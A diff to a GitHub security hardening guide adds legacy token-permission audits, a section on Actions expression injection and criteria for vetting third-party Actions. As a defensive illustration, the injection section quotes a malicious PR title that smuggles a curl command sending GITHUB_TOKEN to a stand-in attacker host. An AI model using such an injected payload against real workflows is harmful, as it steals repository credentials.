@@ -1155,12 +1155,14 @@ Prevent use of arbitrary third-party Actions by restricting to GitHub-verified c
 **SLSA:** Build L2 requirement
 
 #### Description
-Set GitHub Actions `GITHUB_TOKEN` permissions to read-only by default. Grant write permissions only when explicitly needed per workflow.
+Set GitHub Actions `GITHUB_TOKEN` permissions to read-only by default. Grant write permissions only when explicitly needed per workflow. Audit legacy repositories (created before February 2023) that may still use the dangerous `write-all` default.
 
 #### Rationale
-**Default Risk:** By default, `GITHUB_TOKEN` has write access to repository contents, packages, pull requests, etc. Compromised workflow can modify code.
+**Default Risk:** Repositories created before February 2023 still default to `write-all` GITHUB_TOKEN permissions. Workflows in these repos can modify code, create releases, push packages, and approve PRs without any explicit permission declaration. New repos (post-Feb 2023) default to read-only, but the legacy default is never automatically updated.
 
-**Least Privilege:** Start with no permissions, add only what's needed.
+**Real-World Incident:** The Shai Hulud worm (November 2025) propagated through repositories with `write-all` GITHUB_TOKEN defaults. The worm exploited `pull_request_target` workflows to steal PATs from PostHog and AsyncAPI, then used those tokens to publish backdoored npm packages that spread to 25,000+ repositories. Repos with restrictive token permissions were not affected.
+
+**Least Privilege:** Every workflow should declare `permissions: {}` at the top level and grant only what each job needs.
 
 #### ClickOps Implementation
 
@@ -1180,11 +1182,21 @@ Set GitHub Actions `GITHUB_TOKEN` permissions to read-only by default. Grant wri
 
 In each workflow file, explicitly declare required permissions. See the workflow template in the Code Pack below.
 
+**Step 4: Audit Legacy Repositories for write-all Defaults**
+1. Repositories created before February 2023 may still use the legacy `write-all` GITHUB_TOKEN default
+2. Run the legacy audit script (see Code Pack below) to identify all repos with `default_workflow_permissions: write`
+3. Remediate by setting each repo's default to `read` via `gh api -X PUT /repos/ORG/REPO/actions/permissions/workflow -f default_workflow_permissions=read`
+4. Or set organization-wide: `gh api -X PUT /orgs/ORG/actions/permissions/workflow -f default_workflow_permissions=read`
+
 **Time to Complete:** ~5 minutes org-wide + per-workflow updates
 
 #### Code Implementation
 
 {% include pack-code.html vendor="github" section="3.4" %}
+
+#### Legacy write-all Audit
+
+{% include pack-code.html vendor="github" section="3.16" %}
 
 #### Common Permission Combinations
 
@@ -1874,40 +1886,7 @@ Prevent prompt injection attacks where untrusted input (issue titles, PR descrip
 
 #### Code Implementation
 
-**Anti-Pattern — Vulnerable to prompt injection:**
-```yaml
-# BAD: passes raw user input to AI tool
-- name: AI Review
-  run: |
-    echo "Review this PR: ${{ github.event.pull_request.body }}" | \
-      curl -X POST https://api.openai.com/v1/chat/completions ...
-```
-
-**Correct — sanitized input with restricted permissions:**
-```yaml
-# GOOD: sanitize input, restrict permissions
-permissions:
-  contents: read
-  pull-requests: read
-
-jobs:
-  ai-review:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Sanitize PR input
-        id: sanitize
-        run: |
-          # Truncate and strip control characters
-          PR_BODY=$(echo "$RAW_BODY" | head -c 4000 | tr -d '\000-\011\013-\037')
-          echo "body=$PR_BODY" >> "$GITHUB_OUTPUT"
-        env:
-          RAW_BODY: ${{ github.event.pull_request.body }}
-
-      - name: AI Review (read-only)
-        run: |
-          # AI tool receives sanitized input with no write permissions
-          ./run-ai-review --input "${{ steps.sanitize.outputs.body }}" --read-only
-```
+{% include pack-code.html vendor="github" section="3.24" %}
 
 #### Validation & Testing
 1. No workflow passes raw `github.event.*.body`, `.title`, or `.comment` directly to AI tools
@@ -1924,6 +1903,157 @@ jobs:
 | **NIST 800-53** | SI-10, SA-11 | Information input validation, developer security testing |
 | **ISO 27001** | A.14.2.5 | Secure system engineering principles |
 | **CIS Controls** | 16.12 | Implement code-level security checks |
+
+---
+
+### 3.13 Prevent GitHub Actions Expression Injection
+
+**Profile Level:** L1 (Baseline)
+**NIST 800-53:** SI-10, SA-11
+**CIS Controls:** 16.12
+
+#### Description
+Prevent shell command injection attacks caused by GitHub Actions expression syntax (`${{ }}`) interpolating user-controlled values directly into `run:` script blocks. This is the same class of vulnerability as SQL injection or PHP template injection — user input is concatenated into executable code without escaping. Attackers craft malicious PR titles, branch names, issue bodies, or commit messages containing shell metacharacters that execute when the workflow runs.
+
+#### Rationale
+**Attack Vector:** GitHub Actions processes `${{ }}` expressions via string interpolation BEFORE the shell parses the command. A PR title like `"; curl attacker.com/exfil?t=$GITHUB_TOKEN #` becomes part of the shell command, executing arbitrary code with the workflow's permissions and secret access.
+
+**Why This Matters:**
+- This is the most common GitHub Actions vulnerability class — it affects any workflow that uses `${{ github.event.* }}` expressions in `run:` blocks
+- The `${{ }}` syntax performs raw string replacement with no escaping — the same fundamental mistake as PHP's `mysql_query("SELECT * FROM users WHERE name='$_GET[name]'")`
+- Unlike `pull_request_target` (which requires a fork), expression injection works on any workflow trigger that processes user-controlled context: `issues`, `issue_comment`, `pull_request`, `push` (via branch names), and more
+- Static analysis tools (`zizmor`, `actionlint`) can automatically detect these patterns
+
+**Real-World Incidents:**
+- **Ultralytics (March 2025):** Expression injection in a GitHub Actions workflow allowed attackers to inject malicious code via crafted branch names, leading to cryptomining code being published to PyPI in packages v8.3.41 and v8.3.42
+- **PostHog / AsyncAPI via Shai Hulud v2 (November 2025):** Attackers exploited `pull_request_target` workflows with expression injection to steal GitHub bot PATs, which were then used to backdoor npm packages affecting 25,000+ repositories
+- **GitHub Security Lab:** Has disclosed dozens of expression injection vulnerabilities in popular open-source projects through coordinated disclosure
+
+**Dangerous Expressions (user-controlled input):**
+- `github.event.issue.title` / `.body`
+- `github.event.pull_request.title` / `.body`
+- `github.event.comment.body`
+- `github.event.review.body`
+- `github.event.head_commit.message`
+- `github.head_ref` (PR source branch name)
+- `github.event.discussion.title` / `.body`
+
+#### ClickOps Implementation
+
+**Step 1: Audit Workflows for Unsafe Expressions**
+1. Run `zizmor .github/workflows/` to scan for expression injection (install: `cargo install zizmor` or `brew install zizmor`)
+2. Or run the HTH audit script (see Code Pack) which checks all dangerous `${{ github.event.* }}` patterns in `run:` blocks
+3. Also run `actionlint .github/workflows/*.yml` for structural validation
+4. Any `${{ github.event.*.title }}`, `${{ github.event.*.body }}`, or `${{ github.head_ref }}` inside a `run:` block is a finding
+
+**Step 2: Remediate by Using Environment Variables**
+1. Move every dangerous `${{ }}` expression from `run:` blocks to `env:` blocks
+2. Reference the value via `$ENV_VAR` in the shell command
+3. When the value is in an environment variable, the shell treats it as data, not code — the same principle as parameterized SQL queries
+
+**Step 3: Add `zizmor` to CI**
+1. Add a zizmor GitHub Action to your PR workflow that triggers on changes to `.github/workflows/` and `.github/actions/`
+2. zizmor outputs SARIF that integrates with GitHub Code Scanning alerts
+3. This catches new expression injection regressions before they merge
+
+**Step 4: Use `actions/github-script` for Complex Logic**
+1. For workflows that need to process user input programmatically, use `actions/github-script` instead of shell scripts
+2. JavaScript context handles strings as data, not executable code
+3. Access user input via `context.payload.pull_request.title` — no shell interpolation
+
+**Time to Complete:** ~15 minutes (audit); ~5 minutes per workflow to remediate
+
+#### Code Implementation
+
+{% include pack-code.html vendor="github" section="3.25" %}
+
+#### Validation & Testing
+1. Run `zizmor .github/workflows/` — zero expression injection findings
+2. No `${{ github.event.*.body }}` or `${{ github.event.*.title }}` appears inside any `run:` block
+3. All user-controlled values are accessed via `env:` blocks in workflows
+4. `zizmor` CI action runs on every PR that modifies workflow files
+5. Run the HTH audit script — exit code 0
+
+#### Compliance Mappings
+
+| Framework | Control ID | Control Description |
+|-----------|-----------|---------------------|
+| **SOC 2** | CC6.1, CC8.1 | Logical access security; change management |
+| **NIST 800-53** | SI-10, SA-11 | Information input validation; developer security testing |
+| **SLSA** | Build L2 | Scripted build, parameterized |
+| **CIS Controls** | 16.12 | Implement code-level security checks |
+
+---
+
+### 3.14 Evaluate Action Trust Before Adoption
+
+**Profile Level:** L2 (Hardened)
+**NIST 800-53:** SA-12, RA-3
+**CIS Controls:** 2.5
+
+#### Description
+Establish a formal evaluation framework for vetting GitHub Actions before adoption. Any public repository can be referenced as an Action — there is no publish gate, no code review, no distinction between an actively maintained security tool and an abandoned repo. Treat Action adoption with the same rigor as adding a new software dependency.
+
+#### Rationale
+**Why This Matters:**
+- Unlike npm (`npm publish`), PyPI (upload flow), or Docker Hub (verified publishers), GitHub has no dedicated publish mechanism for Actions — any public repo at any mutable tag is usable as an Action
+- The "Verified Creator" badge on the GitHub Marketplace only indicates the publisher's identity was verified, not that the Action's code was reviewed for security
+- An attacker can publish a typosquatted Action (e.g., `actions/checkout` vs `action/checkout`) that looks legitimate but contains malicious code
+- Composite actions and reusable workflows introduce transitive trust — you trust not just the action, but everything it internally references
+
+**Evaluation Criteria:**
+Before adopting any new Action, evaluate:
+1. **Publisher identity:** Is this from an organization you trust? Is it in the GitHub Marketplace with a Verified Creator badge?
+2. **Source code review:** Have you reviewed the `action.yml`, all referenced scripts, and the Dockerfile (if Docker-based)?
+3. **Maintenance status:** When was the last commit? Are issues being addressed? Is there more than one maintainer?
+4. **Dependency chain:** What does this action internally reference? Use `poutine` or `octopin --transitive` to map the full dependency tree
+5. **Security posture:** Does the repo have branch protection, signed commits, security policy, and vulnerability disclosure process?
+6. **Permission scope:** What permissions does the action require? Does it need `contents: write` or `secrets: inherit`? Can you scope it down?
+7. **Alternatives:** Is there a first-party GitHub feature or a more established action that does the same thing?
+
+#### ClickOps Implementation
+
+**Step 1: Create an Action Allowlist Policy**
+1. Navigate to: **Organization Settings** → **Actions** → **General**
+2. Select **"Allow select actions and reusable workflows"**
+3. Check **"Allow actions created by GitHub"** and **"Allow actions by Marketplace verified creators"**
+4. Add specific allowed actions in the allowlist field for any non-verified actions your team needs
+5. This prevents developers from using arbitrary unvetted actions
+
+**Step 2: Maintain an Action Registry**
+1. Create an internal registry (spreadsheet, wiki, or YAML file in a governance repo) documenting every approved action
+2. For each action, record: name, publisher, version pinned to, SHA, last review date, reviewer, permissions required, transitive dependencies, and risk tier
+3. Require a security review before any new action is added to the allowlist
+
+**Step 3: Automate Action Vetting in CI**
+1. Use `poutine` to scan workflows for supply chain risks: `docker run ghcr.io/boostsecurityio/poutine:latest analyze_repo --token $GITHUB_TOKEN org/repo`
+2. Use `zizmor` for static analysis of workflow security
+3. Use `scorecard` (OpenSSF) to assess the security posture of action source repos: `scorecard --repo github.com/action-org/action-name`
+4. Block PRs that add unvetted actions via CODEOWNERS on `.github/workflows/` (see Section 3.11)
+
+**Step 4: Pin and Monitor Approved Actions**
+1. Pin all approved actions to full commit SHAs (see Section 3.10)
+2. Configure Dependabot or Renovate to propose updates when new versions release
+3. Review the changelog and diff for each update before merging
+4. Re-evaluate actions annually or when major versions change
+
+**Time to Complete:** ~30 minutes (initial policy); ~10 minutes per action to evaluate
+
+#### Validation & Testing
+1. Organization Actions policy is set to allowlist mode (not "Allow all actions")
+2. Internal action registry exists and is maintained
+3. All actions in workflows appear in the approved registry
+4. `poutine` and `zizmor` run in CI on workflow file changes
+5. CODEOWNERS requires security team approval for `.github/workflows/` changes
+
+#### Compliance Mappings
+
+| Framework | Control ID | Control Description |
+|-----------|-----------|---------------------|
+| **SOC 2** | CC6.1, CC9.2 | Logical access security; vendor risk management |
+| **NIST 800-53** | SA-12, RA-3 | Supply chain protection; risk assessment |
+| **SLSA** | Build L3 | Audited build platform |
+| **CIS Controls** | 2.5 | Allowlist authorized software |
 
 ---
 
